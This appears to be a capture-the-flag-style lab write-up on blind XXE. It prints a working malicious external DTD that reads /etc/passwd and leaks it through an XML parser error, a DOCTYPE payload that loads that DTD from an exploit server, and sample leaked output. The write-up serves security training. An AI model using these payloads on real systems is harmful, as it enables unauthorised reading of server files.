# Lab: Exploiting Blind XXE to Retrieve Data via Error Messages

## Description

This lab contains a "Check stock" feature that parses XML input but does not display the result of XML parsing. The objective is to exploit a Blind XXE vulnerability using a malicious external DTD and retrieve the contents of the `/etc/passwd` file by inducing an XML parsing error.

## Vulnerability Overview

Although the application does not reflect the result of XML parsing, it returns parser error messages in its responses. By hosting a malicious external DTD, an attacker can read a local file and incorporate its contents into the path of a nonexistent file. When the XML parser attempts to access the invalid file, an error message is generated containing the contents of the target file.

---

## Exploitation Steps

### Step 1: Create a Malicious DTD

Save the following DTD on the exploit server:

```xml id="pr0t8w"
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

### Explanation

* `%file` reads the contents of `/etc/passwd`.
* `%eval` dynamically creates another parameter entity named `%exfil`.
* `%exfil` attempts to load a file whose name contains the contents of `/etc/passwd`.
* Since the file does not exist, the XML parser throws an error containing the invalid filename, thereby disclosing the contents of the file.

---

### Step 2: Host the DTD

Save the malicious DTD on the exploit server and note its URL.

Example:

```text id="tvjlwm"
https://exploit-server-id.exploit-server.net/exploit
```

---

### Step 3: Import the External DTD

Intercept the stock check request and insert the following payload between the XML declaration and the `<stockCheck>` element:

```xml id="75fzyo"
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "YOUR-DTD-URL">
%xxe;
]>
```

Example:

```xml id="mjlwm8"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "https://exploit-server-id.exploit-server.net/exploit">
%xxe;
]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

---

### Step 4: Observe the Error Message

Forward the request.

The XML parser attempts to access:

```text id="djlwm5"
file:///invalid/<contents of /etc/passwd>
```

Since this file does not exist, the parser generates an exception similar to:

```text id="ljlwm2"
java.io.FileNotFoundException:
/invalid/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

The error message exposes the contents of the `/etc/passwd` file, thereby solving the lab.

---

## Result

The contents of the `/etc/passwd` file are disclosed through an XML parsing error message, confirming successful exploitation of the Blind XXE vulnerability.

---

